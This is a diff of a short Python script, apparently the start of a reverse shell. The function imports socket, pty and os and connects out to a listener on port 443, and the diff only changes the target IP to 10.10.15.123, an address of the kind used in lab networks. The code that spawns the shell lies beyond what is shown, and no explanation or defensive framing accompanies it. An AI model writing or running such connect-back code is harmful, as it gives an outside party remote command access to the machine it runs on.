@@ -1,7 +1,7 @@
 #!/usr/bin/python
 def con():
         import socket, time,pty, os
-        host='192.168.1.110'
+        host='10.10.15.123'
         port=443
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.settimeout(10)
